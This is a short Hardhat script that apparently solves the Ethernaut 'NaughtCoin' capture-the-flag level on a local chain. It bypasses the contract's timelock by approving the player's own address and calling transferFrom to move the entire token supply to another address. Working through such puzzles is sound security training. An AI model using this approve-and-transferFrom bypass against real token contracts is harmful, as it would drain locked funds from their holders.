import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = ""

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("NaughtCoin", CONTRACT_ADDRESS, signer)
  //const attackContract = await ethers.getContractAt("NaughtCoinAttack", ATTACK_ADDRESS, signer)
  
  const supply = await contract.INITIAL_SUPPLY()

  console.log(await contract.balanceOf(PLAYER_ADDRESS))

  await contract.approve(PLAYER_ADDRESS, supply)
  await contract.transferFrom(PLAYER_ADDRESS, "0x5FbDB2315678afecb367f032d93F642f64180aa3", supply)

  console.log(await contract.balanceOf(PLAYER_ADDRESS))

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
